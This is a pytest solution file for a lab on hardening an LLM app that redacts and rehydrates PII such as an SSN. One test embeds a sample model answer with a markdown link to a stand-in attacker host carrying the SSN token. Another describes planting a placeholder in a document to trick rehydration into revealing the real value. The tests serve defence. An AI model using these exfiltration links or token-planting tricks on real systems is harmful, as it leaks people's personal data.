"""Lab 5 Solution: what the hardened request flow guarantees. Needs Presidio and en_core_web_sm."""

from lab5_attack_and_harden.vulnerable_app import rehydrate
from solutions.lab5_hardened_app import redact_pii, sanitize_markdown

SSN = "219-09-9999"


def test_real_value_never_reaches_a_url_even_on_an_allowlisted_host() -> None:
    redacted, mapping = redact_pii(f"Employee SSN: {SSN}")
    token = next(t for t in mapping if t.startswith("<US_SSN_"))
    assert SSN not in redacted

    answer = f"The SSN is {token}. ![x](https://docs.acme.example.com/search?q={token}) [doc](https://evil.example/c?d={token})"
    out = rehydrate(sanitize_markdown(answer), mapping)

    assert out.count(SSN) == 1 and out.startswith(f"The SSN is {SSN}.")  # shown in the text, for Hana
    assert "https://docs.acme.example.com/search?q=REDACTED" in out
    assert "evil.example" not in out


def test_placeholder_planted_in_a_document_does_not_resolve_to_a_real_value() -> None:
    """A public page says "<US_SSN_1>"; redaction must not hand out the same token to the real SSN."""
    _, mapping = redact_pii("Hi, this is Hana Kowalski.")
    redacted, mapping = redact_pii(f"Salary record. SSN: {SSN}. Vendor note: reach <US_SSN_1> via the portal.", mapping)

    echoed_note = redacted.split("Vendor note: ", 1)[1]  # the model repeats the vendor note
    assert SSN not in rehydrate(echoed_note, mapping)
    assert SSN in rehydrate(redacted, mapping)  # utility: the real SSN still comes back where it was
